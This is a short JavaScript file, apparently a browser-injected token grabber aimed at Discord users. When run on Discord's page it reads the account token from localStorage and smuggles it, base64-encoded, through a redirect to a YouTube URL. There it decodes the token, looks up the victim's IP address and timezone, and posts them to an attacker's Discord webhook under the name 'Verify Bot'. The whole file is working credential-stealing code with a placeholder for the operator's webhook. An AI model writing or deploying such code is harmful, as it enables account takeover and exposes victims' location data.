setTimeout(() => {
    console.log("Script executed after 2 seconds!");

    const webhookURL = 'enter your discord webhook URL link';

    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param != null) {

            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const message = {
                        username: "Verify Bot",
                        embeds: [
                            {
                                title: "Logged Info",
                                description: `IP: ${ip}\nTimezone: ${timezone}\nToken: ${param}`,
                                color: 16711935 // makes it pink
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .catch(error => console.error('Error1:', error));
                })
                .catch(error => console.error('Error2:', error));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {

        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {
        window.location.href = "https://discord.com/channels/@me";
    }
}, 2000); // 2000ms = 2 seconds
